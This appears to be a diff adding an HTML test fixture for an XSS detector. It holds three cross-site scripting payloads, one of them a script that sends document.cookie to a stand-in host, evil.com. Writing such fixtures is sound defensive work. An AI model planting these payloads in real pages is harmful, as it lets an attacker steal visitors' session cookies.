@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>TEST: XSS Injection</title>
+</head>
+<body>
+<!-- TEST FILE: XSS patterns -->
+<!-- This should trigger: js_xss detector -->
+
+<img src="x" onerror="alert(document.cookie)">
+
+<svg onload="alert('XSS')">
+
+<script>
+document.write('<img src="http://evil.com/steal?c=' + document.cookie + '">');
+</script>
+
+</body>
+</html>
